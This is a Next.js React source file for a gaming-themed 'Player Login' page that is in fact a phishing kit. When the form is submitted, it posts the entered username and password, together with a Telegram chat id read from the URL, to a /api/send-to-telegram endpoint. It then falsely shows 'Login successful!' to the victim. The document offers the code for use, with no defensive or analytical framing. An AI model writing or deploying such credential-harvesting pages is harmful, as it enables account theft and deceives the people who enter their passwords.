// page2.tsx
"use client"

import { Suspense, useState } from "react"
import { useSearchParams } from "next/navigation"

export default function GamingLoginPage() {
  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [message, setMessage] = useState("")
  const searchParams = useSearchParams()
  const chatId = searchParams.get("id")

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    try {
      const response = await fetch("/api/send-to-telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password, chatId, pageType: "Gaming Login" }),
      })

      if (response.ok) {
        setMessage("Login successful!")
        setUsername("")
        setPassword("")
      } else {
        setMessage("Something went wrong. Please try again.")
      }
    } catch (error) {
      setMessage("An error occurred. Please try again.")
    }
  }

  return (
    <Suspense fallback={<div>Loading...</div>}>
      <div className="min-h-screen bg-[#0F172A] flex items-center justify-center p-4 bg-[url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2MCIgaGVpZ2h0PSI2MCI+CjxyZWN0IHdpZHRoPSI2MCIgaGVpZ2h0PSI2MCIgZmlsbD0iIzBGMT72QSI+PC9yZWN0Pgo8Y2lyY2xlIGN4PSIzMCIgY3k9IjMwIiByPSIxIiBmaWxsPSIjMjEyQjQ1IiBmaWxsLW9wYWNpdHk9IjAuNCIgLz4KPC9zdmc+')]">
        <div className="bg-[#1E293B] w-full max-w-md rounded-lg border border-[#334155] p-8 shadow-2xl shadow-blue-500/10">
          <h2 className="text-3xl font-bold text-center mb-8 text-white bg-clip-text bg-gradient-to-r from-blue-400 to-cyan-400">
            Player Login
          </h2>
          <form onSubmit={handleSubmit} className="space-y-6">
            <input
              type="text"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              placeholder="Enter Username"
              className="w-full px-4 py-3 rounded-lg bg-[#0F172A] border border-[#334155] text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-cyan-500"
              required
            />
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Enter Password"
              className="w-full px-4 py-3 rounded-lg bg-[#0F172A] border border-[#334155] text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-cyan-500"
              required
            />
            <button
              type="submit"
              className="w-full bg-gradient-to-r from-blue-500 to-cyan-500 text-white py-3 rounded-lg font-semibold hover:from-blue-600 hover:to-cyan-600 transition-all duration-200 shadow-lg shadow-cyan-500/25"
            >
              LOGIN
            </button>
          </form>
          {message && <p className="mt-4 text-center text-sm text-gray-400">{message}</p>}
        </div>
      </div>
    </Suspense>
  )
}
